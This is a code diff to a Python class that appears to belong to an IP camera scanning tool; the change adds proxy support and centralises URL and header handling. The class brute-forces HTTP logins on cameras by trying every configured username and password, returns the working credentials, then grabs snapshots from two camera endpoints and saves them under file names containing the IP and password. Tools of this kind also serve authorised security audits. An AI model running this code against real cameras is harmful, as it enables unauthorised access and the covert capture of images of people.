@@ -15,13 +15,14 @@ class IPCameraWeakPassword(POCTemplate):
         self.ref = ''
         self.level = POCTemplate.level.low
         self.desc = """"""
-        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
 
     def verify(self, ip, port=80):
+        headers = self._get_headers()
+        proxies = self._get_proxies()
         for user in self.config.users:
             for password in self.config.passwords:
                 try:
-                    r = requests.get(url=f"http://{ip}:{port}", auth=(user, password), timeout=self.config.timeout, headers=self.headers, verify=False)
+                    r = requests.get(url=self._get_url(ip, port, ''), auth=(user, password), timeout=self.config.timeout, headers=headers, verify=False, proxies=proxies)
                     if r.status_code == 200:
                         return ip, str(port), self.product, str(user), str(password), self.name
                 except Exception as e:
@@ -32,8 +33,8 @@ class IPCameraWeakPassword(POCTemplate):
         ip, port, product, user, password, vul = results
         img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
         for url in [
-                f"http://{ip}:{port}/media/?action=snapshot",
-                f"http://{ip}:{port}/cgi-bin/images_cgi?channel=0",
+                self._get_url(ip, port, '/media/?action=snapshot'),
+                self._get_url(ip, port, '/cgi-bin/images_cgi?channel=0'),
             ]:
             if self._snapshot(url, img_file_name, auth=(user, password)):
                 return 1
